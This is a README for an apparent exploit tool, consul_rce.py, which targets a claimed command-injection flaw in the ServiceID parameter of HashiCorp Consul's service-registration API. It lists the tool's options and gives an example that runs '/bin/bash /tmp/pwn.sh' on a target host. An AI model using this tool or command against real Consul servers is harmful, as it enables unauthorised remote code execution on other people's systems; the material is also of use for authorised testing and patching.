## Hashicorp Consul - Remote Command Execution via Services API

This script exploits a command injection vulnerability in Consul Api Services. The vulnerability exists in the `ServiceID` parameter of the `PUT /v1/agent/service/register` API endpoint. The `ServiceID` parameter is used to register a service with the Consul agent. The `ServiceID` parameter is not sanitized and allows for command injection. This vulnerability can be used to execute arbitrary commands on the host running the Consul agent.

### Usage

```
python3 consul_rce.py -h
usage: consul_rce.py [-h] -th TARGET_HOST -tp TARGET_PORT -c COMMAND [-s SSL] [-ct CONSUL_TOKEN]

optional arguments:
  -h, --help            show this help message and exit
  -th TARGET_HOST, --target_host TARGET_HOST
                        Target Host (REQUIRED)
  -tp TARGET_PORT, --target_port TARGET_PORT
                        Target Port (REQUIRED)
  -c COMMAND, --command COMMAND
                        Command to execute (REQUIRED)
  -s SSL, --ssl SSL     SSL
  -ct CONSUL_TOKEN, --consul-token CONSUL_TOKEN
                        Consul Token
```

### Example

```
python3 consul_rce.py -th 127.0.0.1 -tp 8500 -ct <CONSUL_TOKEN> -c "/bin/bash /tmp/pwn.sh"
```